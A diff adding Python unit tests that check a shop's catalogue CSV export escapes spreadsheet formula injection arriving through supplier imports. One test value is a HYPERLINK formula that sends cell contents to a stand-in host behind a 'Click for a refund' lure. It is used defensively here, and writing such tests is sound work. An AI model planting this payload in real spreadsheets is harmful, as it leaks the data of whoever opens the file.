@@ -7,11 +7,13 @@ The import is two-phase on purpose, so the tests check both halves: that
 
 from __future__ import annotations
 
+import csv
 import unittest
 
 from app.services import catalog_io as service
 from app.services import products as products_service
 from app.services import suppliers as suppliers_service
+from app.spreadsheets import FORMULA_STARTERS
 from tests.support import DatabaseTestCase
 
 HEADER = "sku,name,category,supplier,cost_usd,price_usd,stock_qty\n"
@@ -169,6 +171,85 @@ class ExportTests(CatalogTestCase):
         plan = service.analyse(path)
         self.assertEqual(plan.creates, 1)
         self.assertEqual(plan.errors, [])
+
+
+class FormulaInjectionTests(CatalogTestCase):
+    """The whole chain, because both ends of it are in this module.
+
+    A supplier sends a price list with a formula for a product name. The shop
+    imports it, which is what this module is for. Weeks later somebody exports
+    the catalogue to send to the accountant and opens it to check it, and the
+    formula runs on the shop's machine under the shop's account. Nothing in
+    between is unusual, which is what makes it worth a test.
+    """
+
+    PAYLOAD = '=HYPERLINK("http://example.invalid/"&A1,"Click for a refund")'
+
+    def _supplier_file(self, name: str):
+        """Written with csv.writer, the way the supplier's system would."""
+        path = self._tmp / "supplier.csv"
+        with open(path, "w", newline="", encoding="utf-8") as handle:
+            writer = csv.writer(handle)
+            writer.writerow(HEADER.strip().split(","))
+            writer.writerow(["S1", name, "Tools", "Acme", "4.00", "10.00", "7"])
+        return path
+
+    def test_an_imported_payload_does_not_come_back_out_as_a_formula(self):
+        supplier_file = self._supplier_file(self.PAYLOAD)
+        service.apply(service.analyse(supplier_file))
+        self.assertEqual(
+            products_service.get_product(1)["name"],
+            self.PAYLOAD,
+            "the name should be stored exactly as the file gave it",
+        )
+
+        exported = self._tmp / "export.csv"
+        service.export_products(exported)
+        with open(exported, newline="", encoding="utf-8-sig") as handle:
+            cell = next(csv.DictReader(handle))["name"]
+        self.assertFalse(
+            cell.startswith(FORMULA_STARTERS),
+            f"{cell!r} would be evaluated when the accountant opens the file",
+        )
+
+    def test_every_free_text_column_is_covered_not_just_the_name(self):
+        products_service.create_product(
+            sku="=1+1", name="+Widget", price_usd="10", cost_usd="4",
+            stock_qty=1, description="@SUM(A:A)", barcode="-99",
+        )
+        exported = self._tmp / "export.csv"
+        service.export_products(exported)
+        with open(exported, newline="", encoding="utf-8-sig") as handle:
+            row = next(csv.DictReader(handle))
+        for column in ("sku", "barcode", "name", "description"):
+            with self.subTest(column=column):
+                self.assertFalse(row[column].startswith(FORMULA_STARTERS))
+
+    def test_the_numbers_stay_numbers(self):
+        """Escaping a negative total would reach the accountant as text."""
+        products_service.create_product(
+            sku="S1", name="Widget", price_usd="10", cost_usd="4", stock_qty=7
+        )
+        exported = self._tmp / "export.csv"
+        service.export_products(exported)
+        with open(exported, newline="", encoding="utf-8-sig") as handle:
+            row = next(csv.DictReader(handle))
+        self.assertEqual(row["price_usd"], "10.00")
+        self.assertEqual(row["stock_qty"], "7")
+
+    def test_the_escaping_does_not_show_up_as_a_change_on_re_import(self):
+        """Otherwise every export/import cycle would rewrite the catalogue."""
+        products_service.create_product(
+            sku="S1", name=self.PAYLOAD, price_usd="10", cost_usd="4",
+            stock_qty=7, description="'already quoted'",
+        )
+        exported = self._tmp / "export.csv"
+        service.export_products(exported)
+
+        plan = service.analyse(exported)
+        self.assertEqual(plan.rows[0].message, "No changes")
+        self.assertEqual(plan.rows[0].values["name"], self.PAYLOAD)
+        self.assertEqual(plan.rows[0].values["description"], "'already quoted'")
 
 
 if __name__ == "__main__":
